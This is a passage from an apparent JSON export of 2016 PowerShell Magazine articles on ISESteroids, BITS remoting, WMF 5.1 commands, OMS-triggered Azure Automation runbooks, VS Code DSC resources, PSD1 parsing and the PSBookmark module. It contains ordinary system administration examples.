cmdlet Get-PSSharperData which provides the PSSharper information for the currently selected editor pane.\nNext Steps ISESteroids (and PSSharper) is a work in progress, driven by your excellent feedback and our usability labs results, and backed by the license revenues it generates. As always, even major updates like this one are completely free of charge for anyone with a license – no need for maintenance fees or update licenses.\n8 weeks ago, PSSharper V1 surfaced. Thanks to your great feedback, we added all of what you just have seen, like real-time code analysis, and auto-fixes. This is just a milestone, not the destination. Please provide suggestions for additional rules here: http://www.powertheshell.com/isesteroids2-2/support/.\nWe are working hard to make the internal PSSharper engine compatible with PSScriptAnalyzer rules. And we are aiming to extend compatibility information which currently does not include classes and enums.\nGo For It: Test Drive ISESteroids and PSSharper It takes less than 2 minutes for you to test drive and play with the examples shown in this article, and ISESteroids runs with all features for a full 10 testing days, so plenty of time to polish and analyze lots of scripts. ISESteroids is a simple PowerShell module and loads into the built-in PowerShell ISE. No special privileges required.\nTo download and install the module, we strongly recommend that you launch the PowerShell ISE and use the following simple command inside of it:\nInstall-Module –Name ISESteroids –Scope CurrentUser\nNext, load the extension into the PowerShell ISE – and that is really it:\nStart-Steroids\nIf you have installed the module before, either use Update-Module –Name ISESteroids, or use –Force with Install-Module.\nIf the cmdlets Install-Module and Update-Module are missing, you are probably using PowerShell 4 or PowerShell 3. Either upgrade to PowerShell 5 (visit www.powershellgallery.com for the download link), or on the same webpage, download and install the PowerShellGet installer package. It adds the two cmdlets used above to your existing PowerShell version.\nIf you can’t do that either, you can download and install ISESteroids as a ZIP file here: http://www.powertheshell.com/isesteroids2-2/download/\nWhen ISESteroids starts, it displays the location from where it was loaded in the status bar at the bottom of its window. This easily allows you to detect and remove orphaned and older versions of this module in case you have installed it elsewhere before.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/08/10/isesteroids-2-6-with-new-version-of-pssharper-released/","tags":["News"],"title":"ISESteroids 2.6 with new version of PSSharper released"},{"categories":["News"],"contents":"In this article we will look at a new feature in the BITS service which is included in Windows. Some background:\nBackground Intelligent Transfer Service (BITS) transfers files (downloads or uploads) between a client and server and provides progress information related to the transfers. You can also download files from a peer.\nUse cases\n Asynchronously transfer files in the foreground or background. Preserve the responsiveness of other network applications. Automatically resume file transfers after network disconnects and computer restarts.  Source: Microsoft\nPossibly the most known service to leverage BITS is Windows Update, which even though it is downloading large amounts of data, rarely impacts the productivity of users since it is running asynchronous downloads in the background.\nIntroduced in Windows 7, the BitsTransfer PowerShell module contains several cmdlets for administering the BITS client:\nThis means we can leverage the benefits of BITS from PowerShell, as an alternative to using, for example, Invoke-WebRequest.\nPreviously, using cmdlets in the BITS module was not supported when invoked via PowerShell remoting. Let’s verify this on Windows 10 build 1511:\nInvoke-Command -ComputerName CLIENT-JR-02 -ScriptBlock { Write-Output \u0026#34;Testing remote BITS on PowerShell version $($PSVersionTable.PSVersion.ToString())\u0026#34; Start-BitsTransfer -Source \u0026#39;https://github.com/janegilring/PSVersion/archive/master.zip\u0026#39; -Destination $env:TEMP -Asynchronous } We got an error message stating “The remote use of BITS is not supported. For more information about BITS, see the MSDN documentation at http://go.microsoft.com/FWLINK/?LinkId=140888”.\nThere is also a Microsoft Connect item logged regarding this issue.\nNow, let’s try the same thing against a Windows 10 computer running Windows 10 Anniversary Update:\nThis is good news, as BITS via PowerShell remoting is now supported in PowerShell 5.1. Most likely this will also be supported in Windows Server 2016, which will be released at the Microsoft Ignite conference at the end of September.\nYou can find additional details and examples in this article on MSDN.\nAs stated in the article, A BITS Job created from a Remote PowerShell session runs under that session’s user account context and will only make progress when there is at least one active local logon session or Remote PowerShell session associated with that user account. Therefore, we would need to add -InDisconnectedSession to Invoke-Command in our example above for it to work properly. Alternatively we could have entered an interactive session using Enter-PSSession or setup a new PowerShell session using New-PSSession beforehand to run the BITS job in.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/08/03/windows-10-anniversary-update-brings-remoting-support-for-bits/","tags":["News"],"title":"Windows 10 Anniversary Update Brings Remoting Support for BITS"},{"categories":["Tips and Tricks"],"contents":"Windows 10 Anniversary Update was made generally available on August 2, 2016.\nIncluded in the update is a new version of Windows Management Framework, which has now reached version 5.1. By using the Get-PSVersion function in the PSVersion module I released earlier this year, we can determine that the build number is now 5.1.14393.0:\nBy using Get-PSVersion -ListVersion we can also see the full history of PowerShell 5.* RTM versions for comparison:\nWhat might be even more interesting is to check out what commands are new between 5.1.14393.0 and the previous RTM build (5.0.10586.494). To make this process more convenient we can leverage another module I released this year, the PSVersionCompare module. Details on how to install it and perform a comparison between two PowerShell versions is available in “Comparing Commands Between PowerShell Versions” article.\nSince the initial release, I have also added functions to compare automatic variables as well. This is the commands I ran to compare the XML files from computer A running version 5.0.10586.494 and computer B running version 5.1.14393.0:\nInstall-Module -Name PSVersionCompare Import-Module -Name PSVersionCompare $PSDataPath = \u0026#34;~\\Documents\u0026#34; $OutputPath = \u0026#34;~\\Documents\u0026#34; $SourceVersion = \u0026#39;Microsoft Windows 10 Enterprise_5.0.10586.494_Desktop\u0026#39; $CompareVersion = \u0026#39;Microsoft Windows 10 Enterprise_5.1.14393.0_Desktop\u0026#39; $Computers = @(\u0026#39;ComputerA\u0026#39;,\u0026#39;ComputerB\u0026#39;) foreach ($Computer in $Computers) { Get-PSVersionCommand -ComputerName $Computer -Export -Verbose Get-PSVersionVariable -ComputerName $Computer -Export -Verbose } Compare-PSVersionCommand -SourceVersionPath (Join-Path -Path $PSDataPath -ChildPath ($SourceVersion + \u0026#39;_Commands.xml\u0026#39;)) -CompareVersionPath (Join-Path -Path $PSDataPath -ChildPath ($CompareVersion + \u0026#39;_Commands.xml\u0026#39;)) 6\u0026amp;gt;\u0026amp;1 | Out-File -FilePath (Join-Path -Path $OutputPath -ChildPath ($SourceVersion + \u0026#39;_\u0026#39; + $CompareVersion + \u0026#39;_Commands.txt\u0026#39;)) Compare-PSVersionVariable -SourceVersionPath (Join-Path -Path $PSDataPath -ChildPath ($SourceVersion + \u0026#39;_Variables.xml\u0026#39;)) -CompareVersionPath (Join-Path -Path $PSDataPath -ChildPath ($CompareVersion + \u0026#39;_Variables.xml\u0026#39;)) 6\u0026amp;gt;\u0026amp;1 | Out-File -FilePath (Join-Path -Path $OutputPath -ChildPath ($SourceVersion + \u0026#39;_\u0026#39; + $CompareVersion + \u0026#39;_Variables.txt\u0026#39;)) There is a lot of changes, which you can review in the following files generated by the above commands:\n Microsoft Windows 10 Enterprise_5.0.10586.494_Desktop_Microsoft Windows 10 Enterprise_5.1.14393.0_Desktop_Commands.txt Microsoft Windows 10 Enterprise_5.0.10586.494_Desktop_Microsoft Windows 10 Enterprise_5.1.14393.0_Desktop_Variables.txt  Some highlights to notice:\n Four new modules: AppvClient, Microsoft.PowerShell.LocalAccounts, Microsoft.PowerShell.Operation.Validation and UEV Three new cmdlets in module Microsoft.PowerShell.Management: Get-ComputerInfo, Get-TimeZone, and Set-TimeZone Test-Connection has new parameters to support both DCOM and WSMan protocols. Test-NetConnection has new parameters for constraining to an Interface or Source address. The PackageManagement and PowerShellGet modules have new parameters for proxy support. PSReadLine now has ViMode support. A large number of changes in the Storage module. A new automatic variable: PSEdition. The purpose of this variable is to make it possible to distinguish between Desktop edition (“regular” PowerShell based on the full .NET Framework) and Core edition (used on Nano Server, based on .NET Core). A couple of other side notes on this topic: PSEdition is also a new property in the $PSVersionTable automatic variable, and Update-ModuleManifest now has a CompatiblePSEditions parameter in order to specify which PowerShell Edition a module supports.  Of course there are many other enhancements in Windows Management Framework 5.1 which we did not discover by using the PSVersionCompare module. Be sure to check out the WMF 5.1 Release notes to find out more.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/08/02/pstip-new-powershell-commands-in-windows-10-anniversary-update/","tags":["Tips and Tricks"],"title":"#PSTip New PowerShell Commands in Windows 10 Anniversary Update"},{"categories":["Azure Automation","Azure"],"contents":"Microsoft Operations Management Suite (OMS) is an IT management solution for the era of the cloud.\nOMS extends System Center IT management to the cloud, enabling greater control, visibility and security across your hybrid cloud.\nThat is Microsoft’s own description of what OMS is and why you should use it.\nIn this article we are going to look at a feature in OMS which makes it possible to automatically trigger Azure Automation runbooks based on alerts.\nThe heart of OMS is the Log Analytics feature, which makes it possible to interact with real-time and historical machine data. These data can be fed into OMS in several ways, but the most common is via the Microsoft Monitoring Agent. Among the data the agent can upload are Windows Event Logs and Windows Performance Counters, but this is something which can be customized in the Data section of the Settings Dashboard:\nAll data uploaded to OMS can be queried using a very powerful search language, not unlike similar products such as Splunk. When accessing the Log Search feature inside the OMS portal, a number of predefined saved searches can be found:\nLooking at examples is great for getting started, but you can also look up the Log Analytics search reference for more details.\nNote that searching the OMS logs can also be performed from PowerShell, but that is a topic for a different article.\nAs an example, let us have a look at the predefined search “All computers with missing updates”. When clicking on that search link we are presented with the following logs and options:\nThe results can be viewed in different ways, such as a list and a table. In this example we can also see a customized view for updates. Similarly, there are other customized views based on the data type. For example, performance data have its own customized views.\nThere is a number of options on the top meny above the results, such as the option to export results and save queries. The feature we are going to focus on and demonstrate in this article is the Alerts feature in OMS Log Analytics.\nBefore we click on the Alert button, we are going to change the search query to a custom search:\nType=Perf (ObjectName:LogicalDisk AND CounterName:\u0026#34;% Free Space\u0026#34; AND InstanceName=\u0026#34;C:\u0026#34; AND CounterValue\u0026lt;15 AND TimeGenerated\u0026gt;NOW-1HOUR) As you probably can guess based on the query, the scenario we want to enable an alert for is C: volumes with less than 15% of free space.\nYou can read more about how Alerts in Log Analytics works in the documentation, but in a nutshell it makes it possible to set up a log search which will trigger an alert based on your own criteria:\nImage credit: Microsoft\nThe Alert actions can be one of the following:\n E-mail – an e-mail with details of the alert will be sent to one or more recipients Webhook – Invoke an external process by triggering a single HTTP POST request. An example of a service which supports webhooks is Slack, where for example can define different channels where alerts is fed into. Runbook – This action will trigger a runbook (PowerShell code) in Azure Automation. Under the hood, this is also a webhook. Using this feature requires that you have added and configured the Automation solution in your OMS workspace.  The runbook action is what we are going to demonstrate in this article.\nWhen our custom search is executed (and optionally saved), we click the Alert button:\nYou are then brought to a page where the alert can be customized:\nYou can customize settings such as severity, time window, and frequency. You can find more information about those in the documentation.\nThe interesting setting in our demo context is the Actions, and specifically the Runbook action. Select Yes, select the runbook you want the alert to trigger and choose whether to execute the runbook in Azure (a sandbox) or on a Hybrid Worker in your own environment. In our demo scenario we want the remediation runbook to take actions against the computers having low disk space, thus I chose to execute the runbook on a Hybrid Worker which do have access to my local network.\nAfter saving the alert rule, we can see that a webhook has been automatically created on the specified runbook in Azure Automation:\nNext, we will have a look at the runbook we selected in the new OMS Alert, since there are some important considerations to make during authoring.\nThe whole runbook is available as a Gist on GitHub, and I am going to explain the important parts of it below the code:\nFirst, do note the following statements regarding the runbook:\n It is meant for demonstration purposes only, use it at your own risk. Features such as error handling, logging and tests should be added prior to use in a production environment. I would recommend to separate the remediation runbook from the actual runbook doing the remediation in order to keep things clean as well as make testing easier. In practice, this would mean that the Invoke-OMSAlertDiskCleanup runbook would call one or more additional runbooks in order to do actions against the computers the alert is generated for.  Now let us have a closer look at the runbook used in our demo scenario.\nThe first important step is to define a single parameter called $WebhookData of type [object], as this is the parameter OMS Alerts is hardcoded to send information to. It`s not required to define this parameter, but if you want to retrieve the context from the alert inside the runbook it is highly recommended. When defined, $WebhookData will contain three properties:\nImage credit: Microsoft\nYou can read more about details regarding this in the Azure Automation Webhooks documentation.\nThe RequestBody properties contains data in JSON format, which we can convert to PowerShell objects and store in a variable:\n$RequestBody = ConvertFrom-JSON -InputObject $WebhookData.RequestBody Tip: During development of a new runbook for use with OMS Alerts it might be useful to inspect this object interactively. You can temporarily add a line in the runbook to export the object to Clixml:\n$RequestBody | Export-Clixml -Path C:\\Temp\\Invoke-OMSAlertDiskCleanup_RequestBody.xml After the alert has triggered at least once, you should be able to get the XML file from the Hybrid Runbook worker and import it in an interactive PowerShell session for inspection:\nIn the scenario we are working with (OMS Alerts) the RequestBody property will contain a property called SearchResults, where we can find the values from the OMS search that triggered the alarm as we can see above.\nFor our demo runbook where we are interested in doing actions against the computers with less than 15% of free space on the C: drive, we first need to get the computer names. The same computer can occur multiple times, thus we need to extract the unique names:\n$Computers = $RequestBody.SearchResults.value | Sort-Object -Property Computer -Unique Now that we have the names of the computers, we are ready to take an action to try to remediate the problem (low disk space).\nIn this demo we will only perform a single action in a foreach loop–Invoke the Deployment Image Servicing and Management (DISM.exe) command-line tool on the computers via PowerShell remoting to try to clean up installed updates:\n$Cleanup = Invoke-Command -ComputerName $Computer -ScriptBlock {dism.exe /online /Cleanup-Image /StartComponentCleanup} -Credential $Credential Hopefully, this can free up some disk space and potentially resolve the problem.\nThere is a number of additional steps I would consider if doing this in a production environment:\n Add more actions, such as invoking Disk Cleanup (cleanmgr.exe). This might require different logic based on the operating system version, so I did not spend time implementing it in this demo. Add some logic to time stamp the last time a Windows Update cleanup was attempted in order to not invoke it multiple times in a short period of time. If desired and supported by the operating system, you could also consider to automatically expand the C: drive if the computer is a virtual machine and none of the other remediation actions succeeded. Add functionality to determine whether it is allowed to perform this kind of automated maintenance tasks on the computers, something that might not be allowed on critical production systems.  The demonstration scenario is only one of an unlimited number of possible scenarios for automated actions based on a search criterion in OMS. Another scenario can be: “If updates are missing on a computer, trigger the Windows Update client to download and install updates”.\nHopefully this demonstrated how you can leverage the Alerts feature in Microsoft OMS to automatically trigger runbooks in Azure Automation in order to remediate issues in your environment.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/07/11/triggering-azure-automation-runbooks-from-microsoft-oms-alerts/","tags":["Azure Automation","Azure"],"title":"Triggering Azure Automation runbooks from Microsoft OMS Alerts"},{"categories":["Tips and Tricks"],"contents":"The Sysinternals Suite, which contains many tools an IT Professional should have in the tool belt, is now available for Nano Server. Traditionally the tools have been packaged as 32-bit applications, which automatically extract and run the 64-bit version when run on a 64-bit system. Since Nano Server is 64-bit only, the tools had to be rewritten\nto work on Nano Server. Naturally, all tools are not ported, such as those with a graphical user interface (GUI) (e.g. Process Monitor). However, some of the GUI only tools do work remotely against Nano Server. You can get more details and watch demos in this Channel 9 interview with Andrew Mason from the Nano Server team and Mark Russinovich, the creator of the Sysinternals tools.\nThe new Sysinternals Suite for Nano Server is available as a separate download on the Sysinternals Suite on TechNet:\nInstalling and extracting the file on Nano Server is not trivial to do locally, since Invoke-WebRequest is not available on Nano Server and the Expand-Archive cmdlet does not work on Nano in Windows Server 2016 Technical Preview 5 (will work in RTM).\nHowever, that does not stop us from automating installation process. The two cmdlets can simply be run on the local machine and the extracted files can be copied to Nano Server using the new remote file copy capabilities introduced in PowerShell 5.0:\nCopy-Item now lets you copy files or folders from one Windows PowerShell session to another, meaning that you can copy files to sessions that are connected to remote computers, (including computers that are running Windows Nano Server, and thus have no other interface). To copy files, specify PSSession IDs as the value of the new -FromSession and -ToSession parameters, and add –Path and –Destination to specify origin path and destination, respectively. For example, Copy-Item -Path c:\\myFile.txt -ToSession $s -Destination d:\\destinationFolder.\nA PowerShell script demonstrating this technique is available in this Gist on GitHub.\nThe following tools are included in the initial release:\nExample usage of one of the tools – PsInfo:\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/07/06/pstip-download-and-install-sysinternals-suite-for-nano-server/","tags":["Tips and Tricks"],"title":"#PSTip Download and install Sysinternals Suite for Nano Server"},{"categories":["PowerShell","VS Code"],"contents":"I keep re-building my lab machines and in the process I rebuild my development virtual machines. One of the items that gets reinstalled all the time is Visual Studio Code editor. Every time I do this, I end up installing VS Code and all the required extensions manually which isn’t a good use of keystrokes and mouse clicks (if any!). I knew how to install VS Code editor from the command line but I wasn’t sure about the extensions. So, that is when I reached out to David Wilson asking if there is a way to install these extensions using command line.\n@daviwil anyway we can install @code extensions from commandline?\n\u0026mdash; Ravikanth Chaganti (@ravikanth) June 6, 2016  David mentioned that this capability was coming to 1.2.0 and by evening I saw tweets from him that 1.2.0 is released. VS Code version 1.2.0 has the command line parameters for managing extensions.\n code --list-extensions lists all installed extensions code --install-extension installs an extension code --uninstall-extension uninstalls an extension  So, I started writing a DSC resource module to wrap this functionality so that I can use a complete DSC-based method to build my development environment. A couple of hours later, I got the DSC resource module for VS Code. This is available on PowerShell Gallery as well.\nThis module contains a collection of DSC custom resources for installing VS Code and managing VS Code extensions.\nAt present, this DSC resource module includes 2 resources.\n vscodesetup is used to install VS Code editor. vscodeextention is used to manage VS Code extensions.  Before you can use any of these resources in a configuration script, you must first import the vscode module or a specific resource from this module.\nImport-DscResource -Module vscode Import-DscResource -Module vscode -Name vscodesetup Import-DscResource -Name vscodeextension Using vscodesetup resource The vscodesetup resource can be used to install Microsoft Visual Studio Code editor.\nWhen using this resource, both the IsSingleInstance and the Path must be specified. The IsSingleInstance can only have ‘Yes’ as a possible valid value. This is done to ensure that this resource gets used only once in the configuration document. The Path property takes the path to VS Code setup file. This can be downloaded from https://go.microsoft.com/fwlink/?LinkID=623230.\nVSCodeSetup VSCodeSetup { IsSingleInstance = \u0026#39;yes\u0026#39; Path = \u0026#39;C:\\temp\\vscodesetup.exe\u0026#39; PsDscRunAsCredential = $Credential Ensure = \u0026#39;Present\u0026#39; } The PsDscRunAsCredential is important because VS Code installation process creates the .vscode folder that stores all extensions under the logged-in user’s homepath. Without this, this folder gets created at the root of system drive. So, using_PsDscRunAsCredential_, you need to pass the current user credentials.\nUsing vscodeextension resource The vscodeextension can be used to install new VS Code extensions from the marketplace. At this point in time, this relies on the command line provided by VS Code but I am exploring other alternatives. Therefore, only VS Code version 1.2.0 onwards is supported for installing VS Code extensions using this resource.\nThe only mandatory property in this resource is the Name property. You can use this to provide the name of the VS Code extension. Instead of dividing this into two properties like Publisher and Name, I decided to merge both of them into the _Name_property. Therefore the value to this property must be of the form Publisher.ExtensionName. You can find this from the marketplace URL for the extension. Using this method, you can be sure that you are always installing the right extension.\nvscodeextension PowerShellExtension { Name = \u0026#39;ms-vscode.PowerShell\u0026#39; PsDscRunAsCredential = $Credential Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[vscodesetup]VSCodeSetup\u0026#39; } Like the vscodesetup resource configuration, this resource requires PsDscRunAsCredential to ensure the extension gets installed for the current user. Make a note that when using credentials in DSC configuration scripts, you must encrypt them using certificates. If the certificates cannot be deployed in a test or development environment, you can use the_PsDscAllowPlainTextPassword_ attribute in the DSC configuration data. Remember that this is not recommended in production environment.\nHere is an example configuration document that installs VS Code and a couple of extensions.\n$ConfigurationData = @{ AllNodes = @( @{ NodeName = \u0026#39;*\u0026#39; PSDscAllowPlainTextPassword = $true }, @{ NodeName = \u0026#39;localhost\u0026#39; } ) } Configuration VSCodeConfig { param ( [pscredential] $Credential ) Import-DscResource -ModuleName VSCode Node $AllNodes.NodeName { VSCodeSetup VSCodeSetup { IsSingleInstance = \u0026#39;yes\u0026#39; Path = \u0026#39;C:\\temp\\vscodesetup.exe\u0026#39; PsDscRunAsCredential = $Credential Ensure = \u0026#39;Present\u0026#39; } vscodeextension PowerShellExtension { Name = \u0026#39;ms-vscode.PowerShell\u0026#39; PsDscRunAsCredential = $Credential Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[vscodesetup]VSCodeSetup\u0026#39; } vscodeextension CPPExtension { Name = \u0026#39;ms-vscode.cpptools\u0026#39; PsDscRunAsCredential = $Credential Ensure = \u0026#39;Present\u0026#39; DependsOn = \u0026#39;[vscodesetup]VSCodeSetup\u0026#39; } } } VSCodeConfig -ConfigurationData $ConfigurationData -Credential (Get-Credential) TODO There are certainly a few things I want to improve in this and also add more resources for customizing VS Code environment. I also want to explore if there is a better way to install extensions instead of using the command line provided with version 1.2.0.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/06/08/build-your-visual-studio-code-development-environment-using-powershell-dsc/","tags":["PowerShell DSC","VS Code"],"title":"Build Your Visual Studio Code Development Environment Using PowerShell DSC"},{"categories":["DevOps","PowerShell DSC"],"contents":"This part of the series is long due after the first post on DevOps, Infrastructure as Code, and PowerShell DSC. Thanks to PowerShell Conference Europe, I was able to complete what I wanted to publish on GitHub as an example for this article. My session slides and recording should be up in a few days.\nBefore we see what are infrastructure blueprints, let us do a quick recap of what we discussed in the previous post. Within the infrastructure as code practice, we have source/version control for the reusable automation we need for infrastructure deployment and configuration. In the context of DSC, this reusable automation will be a configuration document and the associated DSC resource modules. The DSC resource modules that are needed for the configuration enact process are a prerequisite for the reusable automation. This enables what we called configuration as code in the previous post.\nOne of the most important aspects of infrastructure as code is the testing.\nUnit tests are performed to ensure that the imperative automation behind PowerShell DSC configurations is valid.\nOnce you enact the configuration, you should always validate the desired state. This can be done using integration tests written in Pester.\nOnce the desired state is validated, you must perform operations validation tests to ensure that the infrastructure is functional and working as expected.\nAs an infrastructure developer or an administrator responsible for infrastructure configuration, you always should treat the configuration and the tests associated with that as a single entity. This also makes it easy to share these are reusable patterns. This practice is what I call infrastructure blueprints. Let’s see what exactly these blueprints are?\nIf you are a developer, you must have read or heard about or might even be practicing design patterns. These design patterns are basically solutions to most common problems in application development. These patterns provide reusable designs. In the infrastructure world, we call these design patterns reference architectures. A reference architecture provides a solution template for a given infrastructure requirement. For example, you will find reference architecture papers for implementing a 100,000 Exchange mailbox solution. These reference architectures provide recommendations on choosing the right hardware for a given workload requirement and includes best practices in deploying the application workload. To a large extent, these reference architectures only provide theoretical guidance. By theory I mean that they don’t really provide the how part of the reference architecture implementation but only the what part. The how part of the reference architecture is usually done either manually or, if you are smart enough, in an automated manner.\nSince a complete infrastructure deployment automation example can be very complex, I chose to demonstrate this idea of infrastructure blueprints with a much smaller example of PowerShell DSC and associated tests.\nNow, let’s dig into this in the context of PowerShell DSC by taking a sample scenario.\nWhat is shown in the above diagram is a simple Switch Embedded Team (requires Server 2016) which is used to implement converged networking in Hyper-V. So, within the cluster that I have, I want the converged network switch configuration to be consistent across all nodes in the cluster. Also, I have a set of tests that I want to perform after the resource configuration is complete. This includes both integration and operational validation tests. To be able to share this with my team, I’ve packaged the DSC configuration into a composite configuration and attached the tests with that. This is my infrastructure blueprint for a Hyper-V converged network switch. I can take this and integrate it into a continuous integration/release pipeline and continuously deploy it in a consistent manner.\nHere is how that blueprint looks from a packaging point of view.\nYou can use the NodeData.ps1 to supply the configuration data specific to your environment.\nThe integration tests listed in ConvergedSwitch.tests.ps1 validate that the resources are in desired state or not.\nThe Simple and Comprehensive tests in ConvergedSwitch.Simple.tests.ps1 and ConvergedSwitch.comprehensive.tests.ps1 validate the functionality of the system after the configuration is in desired state. This aligns with the idea of Operation Validation Framework (OVF). We will see more about operations validation in a later post and see what are some limitations and my thoughts on the future of OVF.\nYou may call this something else (and not infrastructure blueprint) but you get the story behind that name and understand what they are.\nI created a GitHub repository to share more infrastructure blueprints and associated tests. Feel free to contribute to this with what you have.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/05/13/devops-infrastructure-as-code-and-powershell-dsc-infrastructure-blueprints/","tags":["DevOps","PowerShell DSC"],"title":"DevOps, Infrastructure as Code, and PowerShell DSC: Infrastructure Blueprints"},{"categories":["News"],"contents":"Session recordings – both videos and screencasts – from PowerShell Conference Europe 2016 are now available. It may be a couple of days before all sessions appear in the playlist.\nI know what my plans for the weekend are! I am really looking forward to all security related sessions that I missed. Both Jared and Will rocked these sessions.\n    ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/05/13/from-psconfeu-2016-session-recordings/","tags":["News","Conferences"],"title":"From PSConfEU 2016 – Session Recordings"},{"categories":["Interviews"],"contents":"This post is a bit delayed, but PowerShell Conference Europe 2016 was a blast. It’s a true global conference with both attendees and speakers from four different continents. I had initially planned to record several interviews with speakers at this conference but unfortunately could not do that. Fortunately, I made up for that by recording an interview with Jeffrey Snover. This interview is over 31 minutes and I really enjoyed talking to Jeffrey.\nJeffrey needs no introduction and we directly go to the questions that we always wanted to ask. In this video, he talked about PowerShell, System Center, Azure Stack, and the future forward!\n   You get to hear about   what Jeffrey thinks went wrong not that well in PowerShell features/design   immutable infrastructure enabled by Desired State Configuration   future of Windows Server 2016   writing DSLs in PowerShell   future of System Center   Open sourcing PowerShell and PowerShell for Linux   how he manages his time and what keeps him motivated   Of course, his upcoming trip to Asia! 🙂    This was a great conversation and I am really looking forward to the future in Microsoft technologies space. ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/05/12/from-psconfeu-2016-a-conversation-with-jeffrey-snover/","tags":["interviews"],"title":"From #PSConfEU 2016 – A Conversation with Jeffrey Snover"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or later.\nBefore PowerShell 4.0, if we had to convert the hash table in a PSD1 file into an object representation, we either used the Import-LocalizedData cmdlet (not really meant for this purpose) or other means. For example, June Blender tweeted one such method.\nConvert hashtable string in file to Hashtable (@Lee_Holmes)\niex (cat -raw \u0026lt;file\u0026gt;)\niex (cat -raw (dir (gmo -l pscx).Modulebase -i *psd1 -r))\n\u0026mdash; June Blender (@juneb_get_help) May 9, 2016  The Invoke-Expression cmdlet can be evil if you don’t know what’s inside the hash table string and can cause serious security issues. There are of course other methods such as a method I used in my PSBookmark module. I just put the hash table string in a .PS1 file and dot-source the PS1 to create an object. However, there are other better ways to achieve this.\nUsing Argument Transformation With PowerShell 4.0 we don’t need all these. For PowerShell DSC, Microsoft introduced a new attribute called _ArgumentToConfigurationDataTransformation_. This is used when compiling a DSC configuration. Here is how I use it.\nfunction Get-ConfigurationDataAsObject { [CmdletBinding()] Param ( [Parameter(Mandatory)] [Microsoft.PowerShell.DesiredStateConfiguration.ArgumentToConfigurationDataTransformation()] [hashtable] $ConfigurationData ) return $ConfigurationData } The beauty of this method is that you can supply a .PSD1 file path and the contents (valid hash table string) gets transformed into an object.\nPS C:\\\u0026gt; Get-ConfigurationDataAsObject -ConfigurationData C:\\Documents\\Github\\PSBookmark\\PSBookmark.psd1 -Verbose Name Value ---- ----- Copyright All Rights Reserved Description Adds the capability to create location bookmarks for easier access. PrivateData {PSData} CompanyName PowerShell Magazine GUID 298a7c5c-d670-4093-bae2-0d6c2935a182 Author Ravikanth Chaganti FunctionsToExport {Save-LocationBookmark, Set-LocationBookmarkAsPWD, Get-LocationBookmark, Remove-LocationBookm... VariablesToExport * RootModule PSBookmark.psm1 AliasesToExport {goto, save, glb, rlb} CmdletsToExport * ModuleVersion 1.0.1 Using AST Converting a hashtable string to an object can be done using AST as well. The following code snippet shows that.\n$script = \u0026#39;C:\\documents\\Github\\psbookmark\\psbookmark.psd1\u0026#39; $scriptAST = [System.Management.Automation.Language.Parser]::ParseFile($script,[ref]$null,[ref]$null) $hashTables = $scriptAST.FindAll({$args[0] -is [System.Management.Automation.Language.HashtableAst]}, $true) $hashTables[0].SafeGetValue() Finally, using the Import-PowerShellDataFile cmdlet In PowerShell 5.0, there is a new cmdlet called Import-PowerShellDataFile which wraps the AST way of generating an object from the hashtable string.\nPS C:\\\u0026gt; Import-PowerShellDataFile -Path \u0026#39;C:\\documents\\Github\\psbookmark\\psbookmark.psd1\u0026#39; Name Value ---- ----- Copyright All Rights Reserved Description Adds the capability to create location bookmarks for easier access. PrivateData {PSData} CompanyName PowerShell Magazine GUID 298a7c5c-d670-4093-bae2-0d6c2935a182 Author Ravikanth Chaganti FunctionsToExport {Save-LocationBookmark, Set-LocationBookmarkAsPWD, Get-LocationBookmark, Remove-LocationBookmark} VariablesToExport * RootModule PSBookmark.psm1 AliasesToExport {goto, save, glb, rlb} CmdletsToExport * ModuleVersion 1.0.1  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2016/05/11/pstip-convert-powershell-data-file-to-an-object/","tags":["Tips and Tricks"],"title":"#PSTip Convert PowerShell Data File to an Object"},{"categories":["Module Spotlight"],"contents":"I work at the command line most of the time and sometimes I find moving to certain folders very tedious and requires lot of typing (even with tab-completion). For example, one of the locations (may not be very frequent) that I move to when working at PowerShell console or ISE is my local GitHub folder where all my repositories are stored. Another example could be the configuration folder in C:\\Windows\\System32. At times, this is frustrating. So, I wanted something simple but useful for me to just type as few characters as possible but still let me navigate to the place I want to.\nSo, this is when I started writing out something quick and added a few functions to my Profile script. And, then I tweeted that! 🙂\nLocation bookmarks in #PowerShell! pic.twitter.com/je278bAWy4\n\u0026mdash; Ravikanth Chaganti (@ravikanth) May 5, 2016  I saw a few suggestions as a response to this.\nPSDrives One suggestion was to use the New-PSDrive cmdlet and add one for each location I want to quickly move to. This is not very intuitive to me. I can map something like Conf: to go to C:\\Windows\\System32\\Configuration but I don’t get tab-completion. I always have to type the full drive name like cd conf:. You can tab-complete within the drive but not the drive itself.\nJump.Location or ZLocation modules These modules are very good. It learns your usage and then auto-completes the path based on the history! This is good if you are frequently accessing a few folders. However, this is not my case, exactly. I wanted an easier way to navigate to a longer path and of course, at the same time make it easy for me to get into some of the folders that I use frequently.\nSo, here it is: PSBookmark!\nPSBookmark This module is a very simple module that provides four commands to manage location bookmarks in PowerShell. This has been very useful for me and while I don’t see me investing lot of time in this, I will certainly implement any feedback or suggestions you may have.\nHow do you get this? Simple! Either clone my Github repo or get it from PowerShell Gallery!\nInstall-Module -Name PSBookmark How to use this? Since the idea is to make it easy to navigate and avoid lot of typing, I will use aliases instead of the full function names. I had a hard time coming up with the function names but aliases were very easy.\nPS C:\\\u0026gt; Get-Command -Module PSBookmark CommandType Name Version Source ----------- ---- ------- ------ Function Get-LocationBookmark 1.0.0 PSBookmark Function Remove-LocationBookmark 1.0.0 PSBookmark Function Save-LocationBookmark 1.0.0 